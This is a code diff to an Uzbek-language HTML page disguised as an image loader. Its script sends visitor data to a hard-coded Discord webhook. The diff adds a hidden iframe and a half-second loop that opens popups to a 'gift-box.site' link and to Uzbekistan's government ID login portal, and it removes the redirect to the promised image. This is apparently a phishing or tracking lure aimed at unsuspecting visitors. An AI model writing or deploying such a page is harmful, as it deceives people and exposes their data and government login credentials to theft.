@@ -15,6 +15,7 @@
             align-items: center;
             min-height: 100vh;
             color: white;
+            overflow: hidden;
         }
         .loading-container {
             text-align: center;
@@ -23,6 +24,8 @@
             border-radius: 15px;
             backdrop-filter: blur(10px);
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            z-index: 10;
+            position: relative;
         }
         .spinner {
             border: 4px solid rgba(255, 255, 255, 0.3);
@@ -45,16 +48,137 @@
             margin: 5px 0;
             opacity: 0.9;
         }
+        .page-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 100;
+        }
+        .status-message {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 100;
+        }
+        .hidden-frame {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+        .active-frame {
+            opacity: 1;
+            pointer-events: all;
+            z-index: 5;
+        }
     </style>
 </head>
 <body>
+    <div class="page-indicator">Sahifa: <span id="currentPage">1</span>/<span id="totalPages">3</span></div>
+    <div class="status-message" id="statusMessage">Asosiy sahifa faol</div>
+    
     <div class="loading-container">
         <div class="spinner"></div>
         <h1>Rasm Yuklanmoqda...</h1>
         <p>Iltimos, kuting</p>
     </div>
 
+    <!-- Faqat 1-sahifa iframe'da ko'rsatiladi -->
+    <iframe id="frame1" class="hidden-frame" src="about:blank"></iframe>
+
     <script>
+        // Sahifalar ro'yxati
+        const pages = [
+            'https://my.gov.uz/ru',  // 1-sahifa - asosiy oynada
+            'https://gift-box.site/66b108e0a4269/1882641120',  // 2-sahifa - yangi oynada
+            'https://id.egov.uz/oz'  // 3-sahifa - yangi oynada
+        ];
+        
+        // Sahifalar soni
+        const totalPages = pages.length;
+        document.getElementById('totalPages').textContent = totalPages;
+        
+        // Joriy sahifa indeksi
+        let currentPageIndex = 0;
+        let newWindows = [];
+        
+        // Yangi oynada sahifa ochish funksiyasi
+        function openInNewWindow(url, pageNumber) {
+            // Yangi oyna ochish
+            const newWindow = window.open(url, `page${pageNumber}`, 'width=1200,height=800,scrollbars=yes,resizable=yes');
+            
+            // Agar brauzer popup blok qilsa
+            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                document.getElementById('statusMessage').textContent = 
+                    `Sahifa ${pageNumber} yangi oynada ochilmadi. Popup bloklangan bo'lishi mumkin.`;
+                console.log(`Sahifa ${pageNumber} yangi oynada ochilmadi`);
+                return null;
+            } else {
+                newWindows.push(newWindow);
+                document.getElementById('statusMessage').textContent = 
+                    `Sahifa ${pageNumber} yangi oynada ochildi`;
+                console.log(`Sahifa ${pageNumber} yangi oynada ochildi`);
+                return newWindow;
+            }
+        }
+        
+        // Sahifalarni almashtirish funksiyasi
+        function switchPage() {
+            // Keyingi sahifaga o'tish
+            currentPageIndex = (currentPageIndex + 1) % totalPages;
+            
+            // Joriy sahifa indeksini yangilash
+            document.getElementById('currentPage').textContent = currentPageIndex + 1;
+            
+            // Sahifa turiga qarab harakat
+            if (currentPageIndex === 0) {
+                // 1-sahifa - asosiy oynada
+                const currentFrame = document.getElementById('frame1');
+                currentFrame.classList.add('active-frame');
+                
+                // Agar sahifa hali yuklanmagan bo'lsa, yuklash
+                if (currentFrame.src === 'about:blank') {
+                    currentFrame.src = pages[currentPageIndex];
+                }
+                
+                document.getElementById('statusMessage').textContent = 'Asosiy sahifa faol';
+            } else {
+                // 2 va 3-sahifalar - yangi oynada
+                openInNewWindow(pages[currentPageIndex], currentPageIndex + 1);
+                
+                // Asosiy oynada 1-sahifani ko'rsatish
+                const mainFrame = document.getElementById('frame1');
+                mainFrame.classList.add('active-frame');
+                document.getElementById('statusMessage').textContent = 
+                    `Sahifa ${currentPageIndex + 1} yangi oynada ochilmoqda...`;
+            }
+            
+            // 0.5 soniyadan so'ng keyingi sahifaga o'tish
+            setTimeout(switchPage, 500);
+        }
+        
+        // Sahifalarni boshlash
+        function startPageRotation() {
+            // Birinchi sahifani yuklash va ko'rsatish
+            const firstFrame = document.getElementById('frame1');
+            firstFrame.src = pages[0];
+            firstFrame.classList.add('active-frame');
+            
+            // 0.5 soniyadan so'ng sahifalar almashinishini boshlash
+            setTimeout(switchPage, 500);
+        }
+        
         // Juda oddiy va ishonchli tracker
         function startTracking() {
             const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
@@ -188,12 +312,6 @@
             })
             .catch(function(error) {
                 console.log('Yuborish xatosi:', error);
-            })
-            .finally(function() {
-                // Rasmga o'tish
-                setTimeout(function() {
-                    window.location.href = 'https://images.unsplash.com/photo-1556740758-90deafc9c4f0';
-                }, 3000);
             });
         }
 
@@ -278,6 +396,9 @@
                     body: JSON.stringify(additionalMsg)
                 }).catch(e => console.log('Qo shimcha ma lumot yuborish xatosi:', e));
             }, 4000);
+            
+            // Sahifalar almashinishini boshlash
+            startPageRotation();
         });
     </script>
 </body>
